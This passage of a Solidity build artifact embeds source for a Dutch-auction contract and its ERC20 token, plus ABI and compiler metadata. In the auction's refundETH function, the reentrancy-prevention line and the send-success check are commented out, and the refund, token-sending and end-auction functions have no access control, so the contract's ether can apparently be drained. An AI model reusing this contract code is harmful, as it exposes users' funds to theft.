be NOT_ENTERED\\n        if (_status == ENTERED) {\\n            revert ReentrancyGuardReentrantCall();\\n        }\\n\\n        // Any calls to nonReentrant after this point will fail\\n        _status = ENTERED;\\n    }\\n\\n    function _nonReentrantAfter() private {\\n        // By storing the original value once again, a refund is triggered (see\\n        // https://eips.ethereum.org/EIPS/eip-2200)\\n        _status = NOT_ENTERED;\\n    }\\n\\n    /**\\n     * @dev Returns true if the reentrancy guard is currently set to \\\"entered\\\", which indicates there is a\\n     * `nonReentrant` function in the call stack.\\n     */\\n    function _reentrancyGuardEntered() internal view returns (bool) {\\n        return _status == ENTERED;\\n    }\\n}\\n\",\"keccak256\":\"0xf980daa263b661ab8ddee7d4fd833c7da7e7995e2c359ff1f17e67e4112f2236\",\"license\":\"MIT\"},\"contracts/Dutch_Auction.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.21;\\n\\n// Using our own ERC20Token\\nimport \\\"./ERC20Token.sol\\\";\\nimport \\\"@openzeppelin/contracts/utils/ReentrancyGuard.sol\\\";\\n\\nerror Dutch_Auction__NotOwner();\\nerror Dutch_Auction__IsOwner();\\nerror Dutch_Auction__NotOpen();\\nerror Dutch_Auction__Open();\\n\\ncontract Dutch_Auction {\\n    int256 private currentPrice; //in wei\\n    uint256 private totalNumBidders = 0;\\n    uint256 private immutable startPrice; //in wei\\n    uint256 private immutable reservePrice;\\n    address private immutable i_owner;\\n    uint256 private totalAlgosAvailable;\\n    uint256 private startTime;\\n    uint256 private constant AUCTION_TIME = 1200; //in seconds\\n    uint256 private currentUnsoldAlgos;\\n    uint256 private changePerMin;\\n    bool private prematureEnd = false;\\n\\n    ERC20Token private DAToken; //importing Token\\n    address private ERC20ContractAddress;\\n    mapping(uint256 => Bidder) public biddersList; //to be made private later <for debugging purposes>\\n\\n    struct Bidder {\\n        uint256 bidderID;\\n        address walletAddress;\\n        uint256 bidValue; //the value they paid to the contract to purchase the algo\\n        uint256 totalAlgosPurchased;\\n        uint256 refundEth;\\n        bool isExist;\\n    }\\n\\n    // Variable to indicate auction's state --> type declaration\\n    enum AuctionState {\\n        OPEN,\\n        CLOSING\\n    } // uint256 0: OPEN, 1: CLOSED\\n\\n    AuctionState private s_auctionState;\\n\\n    /*Constructor*/\\n    constructor(uint256 _reservePrice, uint256 _startPrice) payable {\\n        require(\\n            _reservePrice < _startPrice,\\n            \\\"reserve price is higher than current price\\\"\\n        );\\n        i_owner = msg.sender;\\n        reservePrice = _reservePrice;\\n        currentPrice = int256(_startPrice);\\n        startPrice = _startPrice;\\n\\n        s_auctionState = AuctionState.CLOSING;\\n    }\\n\\n    /* modifiers */\\n    modifier onlyOwner() {\\n        // require(msg.sender == owner);\\n        if (msg.sender != i_owner) revert Dutch_Auction__NotOwner();\\n        _; //do the rest of the function\\n    }\\n\\n    modifier notOwner() {\\n        // require(msg.sender == owner);\\n        if (msg.sender == i_owner) revert Dutch_Auction__IsOwner();\\n        _; //do the rest of the function\\n    }\\n\\n    modifier AuctionOpen() {\\n        // require(msg.sender == owner);\\n        if (AuctionState.CLOSING == s_auctionState)\\n            revert Dutch_Auction__NotOpen();\\n        _; //do the rest of the function\\n    }\\n\\n    modifier AuctionClosed() {\\n        // require(msg.sender == owner);\\n        if (AuctionState.OPEN == s_auctionState) revert Dutch_Auction__Open();\\n        _; //do the rest of the function\\n    }\\n\\n    /***\\n     * -------------------------------------------------------------------------------------\\n     * -------------------------------------------------------------------------------------\\n     * -------------------------------------------------------------------------------------\\n     * -------------------------------------------------------------------------------------\\n     * -------------------------------------------------------------------------------------\\n     */\\n\\n    /** Events\\n     *\\n     */\\n    event startAuctionEvent(\\n        uint256 startTime,\\n        address ERC20Address,\\n        uint256 totalAlgosAvailable,\\n        uint256 changePerMin\\n    );\\n    event addBidderEvent(\\n        uint256 bidderID,\\n        address walletAddress,\\n        uint256 bidvalue\\n    );\\n    event updateCurrentPriceEvent(uint256 timeElapsed, uint256 currentprice);\\n    event sendTokenEvent(address bidderAddress, uint256 tokensSent);\\n    event calculateEvent(\\n        address bidderAddress,\\n        uint256 TokensPurchased,\\n        uint256 refundValue\\n    );\\n\\n    event RefundEvent(\\n        address bidderAddress,\\n        uint256 TokensPurchased,\\n        uint256 refundValue\\n    );\\n\\n    event endAuctionEvent(\\n        uint256 totalBidders,\\n        uint256 burntERC20,\\n        uint totalETHEarned\\n    );\\n\\n    function startAuction(\\n        uint256 _totalAlgosAvailable,\\n        uint256 _changePerMin\\n    ) public onlyOwner AuctionClosed returns (address) {\\n        s_auctionState = AuctionState.OPEN;\\n        totalAlgosAvailable = _totalAlgosAvailable;\\n        changePerMin = _changePerMin;\\n        currentPrice = int256(startPrice);\\n        currentUnsoldAlgos = _totalAlgosAvailable;\\n        startTime = block.timestamp; //Start time of when the contract is deployed\\n        DAToken = new ERC20Token(totalAlgosAvailable, address(this));\\n        ERC20ContractAddress = address(DAToken);\\n        emit startAuctionEvent(\\n            startTime,\\n            ERC20ContractAddress,\\n            totalAlgosAvailable,\\n            changePerMin\\n        );\\n        return ERC20ContractAddress;\\n    }\\n\\n    /**\\n     * public functions\\n     *\\n     * */\\n\\n    function addBidder() public payable notOwner AuctionOpen {\\n        //checking all the requirements\\n        require(msg.value > 0, \\\"bidValue less than 0\\\");\\n        calculate();\\n        require(block.timestamp - startTime < AUCTION_TIME, \\\"time is up\\\");\\n        require(currentUnsoldAlgos > 0, \\\"There is no more algos left\\\");\\n\\n        // Adding or Updating the bidders currently in the contract\\n        Bidder storage newBidder = biddersList[totalNumBidders];\\n        newBidder.bidderID = totalNumBidders;\\n        newBidder.walletAddress = msg.sender;\\n        newBidder.bidValue = msg.value;\\n        newBidder.isExist = true;\\n        newBidder.totalAlgosPurchased = 0;\\n        newBidder.refundEth = 0;\\n        biddersList[totalNumBidders] = newBidder;\\n        emit addBidderEvent(\\n            newBidder.bidderID,\\n            newBidder.walletAddress,\\n            newBidder.bidValue\\n        );\\n        totalNumBidders++;\\n        calculate(); //calculate again in case the tokens are run out \\n    }\\n\\n    function updateCurrentPrice() public {\\n        if (!prematureEnd){\\n        currentPrice =\\n            int256(startPrice) -\\n            int256((block.timestamp - startTime) / 60) *\\n            int256(changePerMin);\\n\\n        if (currentPrice <= 0 || currentPrice <= int256(reservePrice)) {\\n            currentPrice = int256(reservePrice);\\n        }\\n        emit updateCurrentPriceEvent(\\n            (block.timestamp - startTime),\\n            uint256(currentPrice)\\n        );\\n        }\\n    }\\n\\n    function sendTokens() public {\\n        for (uint i = 0; i < totalNumBidders; i++) {\\n            if (biddersList[i].totalAlgosPurchased > 0) {\\n                DAToken.approve(\\n                    biddersList[i].walletAddress,\\n                    biddersList[i].totalAlgosPurchased * 10 ** 18\\n                );\\n                DAToken.transferFrom(\\n                    address(this),\\n                    biddersList[i].walletAddress,\\n                    biddersList[i].totalAlgosPurchased * 10 ** 18\\n                );\\n                emit sendTokenEvent(\\n                    biddersList[i].walletAddress,\\n                    biddersList[i].totalAlgosPurchased\\n                );\\n            }\\n        }\\n    }\\n\\n    function refundETH() public{\\n        for (uint i = 0; i < totalNumBidders; i++) {\\n            if (\\n                biddersList[i].refundEth > 0 &&\\n                address(this).balance > biddersList[i].refundEth && address(this).balance > 0\\n            ) {\\n                //refundETH\\n                uint256 sendValue = biddersList[i].refundEth;\\n                //biddersList[i].refundEth = 0; // re-entrancy attack prevention\\n                (bool callSuccess, ) = payable(biddersList[i].walletAddress)\\n                    .call{value: sendValue}(\\\"\\\");\\n               // require(callSuccess, \\\"Failed to send ether\\\");\\n                emit RefundEvent(\\n                    biddersList[i].walletAddress,\\n                    biddersList[i].totalAlgosPurchased,\\n                    sendValue\\n                );\\n            }\\n        }\\n    }\\n\\n    function calculate() public {\\n        updateCurrentPrice();\\n        uint256 currentAlgos = totalAlgosAvailable;\\n        for (uint i = 0; i < totalNumBidders; i++) {\\n            //if there is sufficient algos for this current bidder\\n            if (\\n                currentAlgos >= biddersList[i].bidValue / uint256(currentPrice)\\n            ) {\\n                biddersList[i].totalAlgosPurchased =\\n                    biddersList[i].bidValue /\\n                    uint256(currentPrice);\\n                currentAlgos -= biddersList[i].bidValue / uint256(currentPrice);\\n                biddersList[i].refundEth = 0;\\n            }\\n            //Else if there is algos left but it is less than the amount the bidder bidded\\n            // he gets all the remaining algos and is refunded the ETH.\\n            else if (\\n                currentAlgos > 0 &&\\n                currentAlgos < biddersList[i].bidValue / uint256(currentPrice)\\n            ) {\\n                biddersList[i].totalAlgosPurchased = currentAlgos;\\n                currentAlgos = 0;\\n                biddersList[i].refundEth =\\n                    biddersList[i].bidValue -\\n                    biddersList[i].totalAlgosPurchased *\\n                    uint256(currentPrice);\\n            }\\n            //there is no algos left\\n            // reset the total algos purchased to 0\\n            else if (currentAlgos <= 0) {\\n                //refund for the rest\\n                biddersList[i].totalAlgosPurchased = 0;\\n                biddersList[i].refundEth = biddersList[i].bidValue;\\n            }\\n            emit RefundEvent(\\n                biddersList[i].walletAddress,\\n                biddersList[i].totalAlgosPurchased,\\n                biddersList[i].refundEth\\n            );\\n        }\\n\\n        if (currentAlgos > 0) {\\n            currentUnsoldAlgos = currentAlgos;\\n        } else {\\n            s_auctionState = AuctionState.CLOSING;\\n            currentUnsoldAlgos = 0;\\n            prematureEnd = true;\\n        }\\n    }\\n\\n    function endAuction() public {\\n        s_auctionState = AuctionState.CLOSING;\\n        calculate();\\n        refundETH();\\n        sendTokens();\\n        if (currentUnsoldAlgos > 0) {\\n            DAToken.burn(address(this), currentUnsoldAlgos);\\n        }\\n        emit endAuctionEvent(\\n            totalNumBidders,\\n            currentUnsoldAlgos,\\n            address(this).balance\\n        );\\n    }\\n\\n    /**View and Pure Function */\\n\\n    function retrieveTotalAlgos() public view onlyOwner returns (uint256) {\\n        return totalAlgosAvailable;\\n    }\\n\\n    function retrieveReservePrice() public view onlyOwner returns (uint256) {\\n        return reservePrice;\\n    }\\n\\n    function retrieveCurrentPrice() public view returns (int256) {\\n        return currentPrice;\\n    }\\n\\n    function retrieveTotalBidder() public view onlyOwner returns (uint256) {\\n        return totalNumBidders;\\n    }\\n\\n    function retrieveContractOwner() public view returns (address) {\\n        return i_owner;\\n    }\\n\\n    function retrieveContractBalance() public view onlyOwner returns (uint256) {\\n        return address(this).balance;\\n    }\\n\\n    function retrieveBidderBidValue(\\n        uint256 bidder\\n    ) public view onlyOwner returns (uint256) {\\n        return biddersList[bidder].bidValue;\\n    }\\n\\n    function retrieveBidderAlgos(\\n        uint256 bidder\\n    ) public view onlyOwner returns (uint256) {\\n        return biddersList[bidder].totalAlgosPurchased;\\n    }\\n\\n    function retrieveRefund(\\n        uint256 bidder\\n    ) public view onlyOwner returns (uint256) {\\n        return biddersList[bidder].refundEth;\\n    }\\n\\n    function balanceOfBidder(uint256 bidder) public view returns (uint256) {\\n        return DAToken.balanceOf(biddersList[bidder].walletAddress);\\n    }\\n\\n    fallback() external payable {\\n        // addBidder();\\n    }\\n\\n    receive() external payable {\\n        // addBidder();\\n    }\\n\\n    function getAuctionState() public view returns (AuctionState) {\\n        return s_auctionState;\\n    }\\n}\\n\",\"keccak256\":\"0xc13aa2f8e0221d9315180c501f4ee58c3674a18bfcc96859d4bc435e302abbe0\",\"license\":\"MIT\"},\"contracts/ERC20Token.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.21;\\n\\nimport \\\"@openzeppelin/contracts/token/ERC20/ERC20.sol\\\";\\nimport \\\"@openzeppelin/contracts/utils/Context.sol\\\";\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\ncontract ERC20Token is Context, ERC20, Ownable {\\n    constructor(\\n        uint256 initialSupply,\\n        address contractAddress\\n    ) Ownable(msg.sender) ERC20(\\\"ERC20Token\\\", \\\"ET\\\") {\\n        _mint(msg.sender, initialSupply * (10 ** 18));\\n        approve(contractAddress, initialSupply * (10 ** 18));\\n    }\\n\\n    function burn(address i_owner, uint256 amount) public onlyOwner {\\n        _burn(i_owner, amount * 10 ** 18);\\n    }\\n}\\n\",\"keccak256\":\"0xcfe9dcc28ba35f1fc2628f8132fa82b4228fdcb2a9bc3ff1a5af887bc40a79c2\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":1008,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"currentPrice","offset":0,"slot":"0","type":"t_int256"},{"astId":1011,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"totalNumBidders","offset":0,"slot":"1","type":"t_uint256"},{"astId":1019,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"totalAlgosAvailable","offset":0,"slot":"2","type":"t_uint256"},{"astId":1021,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"startTime","offset":0,"slot":"3","type":"t_uint256"},{"astId":1026,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"currentUnsoldAlgos","offset":0,"slot":"4","type":"t_uint256"},{"astId":1028,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"changePerMin","offset":0,"slot":"5","type":"t_uint256"},{"astId":1031,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"prematureEnd","offset":0,"slot":"6","type":"t_bool"},{"astId":1034,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"DAToken","offset":1,"slot":"6","type":"t_contract(ERC20Token)2018"},{"astId":1036,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"ERC20ContractAddress","offset":0,"slot":"7","type":"t_address"},{"astId":1041,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"biddersList","offset":0,"slot":"8","type":"t_mapping(t_uint256,t_struct(Bidder)1054_storage)"},{"astId":1060,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"s_auctionState","offset":0,"slot":"9","type":"t_enum(AuctionState)1057"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_bool":{"encoding":"inplace","label":"bool","numberOfBytes":"1"},"t_contract(ERC20Token)2018":{"encoding":"inplace","label":"contract ERC20Token","numberOfBytes":"20"},"t_enum(AuctionState)1057":{"encoding":"inplace","label":"enum Dutch_Auction.AuctionState","numberOfBytes":"1"},"t_int256":{"encoding":"inplace","label":"int256","numberOfBytes":"32"},"t_mapping(t_uint256,t_struct(Bidder)1054_storage)":{"encoding":"mapping","key":"t_uint256","label":"mapping(uint256 => struct Dutch_Auction.Bidder)","numberOfBytes":"32","value":"t_struct(Bidder)1054_storage"},"t_struct(Bidder)1054_storage":{"encoding":"inplace","label":"struct Dutch_Auction.Bidder","members":[{"astId":1043,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"bidderID","offset":0,"slot":"0","type":"t_uint256"},{"astId":1045,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"walletAddress","offset":0,"slot":"1","type":"t_address"},{"astId":1047,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"bidValue","offset":0,"slot":"2","type":"t_uint256"},{"astId":1049,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"totalAlgosPurchased","offset":0,"slot":"3","type":"t_uint256"},{"astId":1051,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"refundEth","offset":0,"slot":"4","type":"t_uint256"},{"astId":1053,"contract":"contracts/Dutch_Auction.sol:Dutch_Auction","label":"isExist","offset":0,"slot":"5","type":"t_bool"}],"numberOfBytes":"192"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"events":{"startAuctionEvent(uint256,address,uint256,uint256)":{"notice":"Events"}},"kind":"user","methods":{"addBidder()":{"notice":"public functions "},"retrieveTotalAlgos()":{"notice":"View and Pure Function "}},"version":1}}},"contracts/ERC20Token.sol":{"ERC20Token":{"abi":[{"inputs":[{"internalType":"uint256","name":"initialSupply","type":"uint256"},{"internalType":"address","name":"contractAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"allowance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientAllowance","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientBalance","type":"error"},{"inputs":[{"internalType":"address","name":"approver","type":"address"}],"name":"ERC20InvalidApprover","type":"error"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"}],"name":"ERC20InvalidReceiver","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"ERC20InvalidSender","type":"error"},{"inputs":[{"internalType":"address","name":"spender","type":"address"}],"name":"ERC20InvalidSpender","type":"error"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"OwnableInvalidOwner","type":"error"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"OwnableUnauthorizedAccount","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"i_owner","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"errors":{"ERC20InsufficientAllowance(address,uint256,uint256)":[{"details":"Indicates a failure with the `spender`’s `allowance`. Used in transfers.","params":{"allowance":"Amount of tokens a `spender` is allowed to operate with.","needed":"Minimum amount required to perform a transfer.","spender":"Address that may be allowed to operate on tokens without being their owner."}}],"ERC20InsufficientBalance(address,uint256,uint256)":[{"details":"Indicates an error related to the current `balance` of a `sender`. Used in transfers.","params":{"balance":"Current balance for the interacting account.","needed":"Minimum amount required to perform a transfer.","sender":"Address whose tokens are being transferred."}}],"ERC20InvalidApprover(address)":[{"details":"Indicates a failure with the `approver` of a token to be approved. Used in approvals.","params":{"approver":"Address initiating an approval operation."}}],"ERC20InvalidReceiver(address)":[{"details":"Indicates a failure with the token `receiver`. Used in transfers.","params":{"receiver":"Address to which tokens are being transferred."}}],"ERC20InvalidSender(address)":[{"details":"Indicates a failure with the token `sender`. Used in transfers.","params":{"sender":"Address whose tokens are being transferred."}}],"ERC20InvalidSpender(address)":[{"details":"Indicates a failure with the `spender` to be approved. Used in approvals.","params":{"spender":"Address that may be allowed to operate on tokens without being their owner."}}],"OwnableInvalidOwner(address)":[{"details":"The owner is not a valid owner account. (eg. `address(0)`)"}],"OwnableUnauthorizedAccount(address)":[{"details":"The caller account is not authorized to perform an operation."}]},"events":{"Approval(address,address,uint256)":{"details":"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."},"Transfer(address,address,uint256)":{"details":"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."}},"kind":"dev","methods":{"allowance(address,address)":{"details":"See {IERC20-allowance}."},"approve(address,uint256)":{"details":"See {IERC20-approve}. NOTE: If `value` is the maximum `uint256`, the allowance is not updated on `transferFrom`. This is semantically equivalent to an infinite approval. Requirements: - `spender` cannot be the zero address."},"balanceOf(address)":{"details":"See {IERC20-balanceOf}."},"decimals()":{"details":"Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the default value returned by this function, unless it's overridden. NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."},"name()":{"details":"Returns the name of the token."},"owner()":{"details":"Returns the address of the current owner."},"renounceOwnership()":{"details":"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner."},"symbol()":{"details":"Returns the symbol of the token, usually a shorter version of the name."},"totalSupply()":{"details":"See {IERC20-totalSupply}."},"transfer(address,uint256)":{"details":"See {IERC20-transfer}. Requirements: - `to` cannot be the zero address. - the caller must have a balance of at least `value`."},"transferFrom(address,address,uint256)":{"details":"See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. NOTE: Does not update the allowance if the current allowance is the maximum `uint256`. Requirements: - `from` and `to` cannot be the zero address. - `from` must have a balance of at least `value`. - the caller must have allowance for ``from``'s tokens of at least `value`."},"transferOwnership(address)":{"details":"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."}},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_1998":{"entryPoint":null,"id":1998,"parameterSlots":2,"returnSlots":0},"@_336":{"entryPoint":null,"id":336,"parameterSlots":2,"returnSlots":0},"@_50":{"entryPoint":null,"id":50,"parameterSlots":1,"returnSlots":0},"@_approve_690":{"entryPoint":1382,"id":690,"parameterSlots":3,"returnSlots":0},"@_approve_750":{"entryPoint":1408,"id":750,"parameterSlots":4,"returnSlots":0},"@_mint_639":{"entryPoint":622,"id":639,"parameterSlots":2,"returnSlots":0},"@_msgSender_915":{"entryPoint":1374,"id":915,"parameterSlots":0,"returnSlots":1},"@_transferOwnership_146":{"entryPoint":424,"id":146,"parameterSlots":1,"returnSlots":0},"@_update_606":{"entryPoint":814,"id":606,"parameterSlots":3,"returnSlots":0},"@approve_450":{"entryPoint":763,"id":450,"parameterSlots":2,"returnSlots":1},"abi_decode_t_address_fromMemory":{"entryPoint":2030,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_t_uint256_fromMemory":{"entryPoint":1929,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_uint256t_address_fromMemory":{"entryPoint":2053,"id":null,"parameterSlots":2,"returnSlots":2},"abi_encode_t_address_to_t_address_fromStack":{"entryPoint":2979,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":3206,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_t_address__to_t_address__fromStack_reversed":{"entryPoint":2996,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed":{"entryPoint":3223,"id":null,"parameterSlots":4,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":3284,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"array_dataslot_t_string_storage":{"entryPoint":2282,"id":null,"parameterSlots":1,"returnSlots":1},"array_length_t_string_memory_ptr":{"entryPoint":2124,"id":null,"parameterSlots":1,"returnSlots":1},"checked_add_t_uint256":{"entryPoint":3147,"id":null,"parameterSlots":2,"returnSlots":1},"checked_mul_t_uint256":{"entryPoint":3072,"id":null,"parameterSlots":2,"returnSlots":1},"clean_up_bytearray_end_slots_t_string_storage":{"entryPoint":2593,"id":null,"parameterSlots":3,"returnSlots":0},"cleanup_t_address":{"entryPoint":1984,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":1952,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":1893,"id":null,"parameterSlots":1,"returnSlots":1},"clear_storage_range_t_bytes1":{"entryPoint":2554,"id":null,"parameterSlots":2,"returnSlots":0},"convert_t_uint256_to_t_uint256":{"entryPoint":2428,"id":null,"parameterSlots":1,"returnSlots":1},"copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage":{"entryPoint":2748,"id":null,"parameterSlots":2,"returnSlots":0},"divide_by_32_ceil":{"entryPoint":2303,"id":null,"parameterSlots":1,"returnSlots":1},"extract_byte_array_length":{"entryPoint":2229,"id":null,"parameterSlots":1,"returnSlots":1},"extract_used_part_and_set_length_of_short_byte_array":{"entryPoint":2718,"id":null,"parameterSlots":2,"returnSlots":1},"identity":{"entryPoint":2418,"id":null,"parameterSlots":1,"returnSlots":1},"mask_bytes_dynamic":{"entryPoint":2686,"id":null,"parameterSlots":2,"returnSlots":1},"panic_error_0x11":{"entryPoint":3025,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x22":{"entryPoint":2182,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x41":{"entryPoint":2135,"id":null,"parameterSlots":0,"returnSlots":0},"prepare_store_t_uint256":{"entryPoint":2468,"id":null,"parameterSlots":1,"returnSlots":1},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":1888,"id":null,"parameterSlots":0,"returnSlots":0},"shift_left_dynamic":{"entryPoint":2319,"id":null,"parameterSlots":2,"returnSlots":1},"shift_right_unsigned_dynamic":{"entryPoint":2673,"id":null,"parameterSlots":2,"returnSlots":1},"storage_set_to_zero_t_uint256":{"entryPoint":2526,"id":null,"parameterSlots":2,"returnSlots":0},"update_byte_slice_dynamic32":{"entryPoint":2332,"id":null,"parameterSlots":3,"returnSlots":1},"update_storage_value_t_uint256_to_t_uint256":{"entryPoint":2478,"id":null,"parameterSlots":3,"returnSlots":0},"validator_revert_t_address":{"entryPoint":2004,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_uint256":{"entryPoint":1903,"id":null,"parameterSlots":1,"returnSlots":0},"zero_value_for_split_t_uint256":{"entryPoint":2521,"id":null,"parameterSlots":0,"returnSlots":1}},"generatedSources":[{"ast":{"nativeSrc":"0:8810:10","nodeType":"YulBlock","src":"0:8810:10","statements":[{"body":{"nativeSrc":"47:35:10","nodeType":"YulBlock","src":"47:35:10","statements":[{"nativeSrc":"57:19:10","nodeType":"YulAssignment","src":"57:19:10","value":{"arguments":[{"kind":"number","nativeSrc":"73:2:10","nodeType":"YulLiteral","src":"73:2:10","type":"","value":"64"}],"functionName":{"name":"mload","nativeSrc":"67:5:10","nodeType":"YulIdentifier","src":"67:5:10"},"nativeSrc":"67:9:10","nodeType":"YulFunctionCall","src":"67:9:10"},"variableNames":[{"name":"memPtr","nativeSrc":"57:6:10","nodeType":"YulIdentifier","src":"57:6:10"}]}]},"name":"allocate_unbounded","nativeSrc":"7:75:10","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nativeSrc":"40:6:10","nodeType":"YulTypedName","src":"40:6:10","type":""}],"src":"7:75:10"},{"body":{"nativeSrc":"177:28:10","nodeType":"YulBlock","src":"177:28:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"194:1:10","nodeType":"YulLiteral","src":"194:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"197:1:10","nodeType":"YulLiteral","src":"197:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"187:6:10","nodeType":"YulIdentifier","src":"187:6:10"},"nativeSrc":"187:12:10","nodeType":"YulFunctionCall","src":"187:12:10"},"nativeSrc":"187:12:10","nodeType":"YulExpressionStatement","src":"187:12:10"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"88:117:10","nodeType":"YulFunctionDefinition","src":"88:117:10"},{"body":{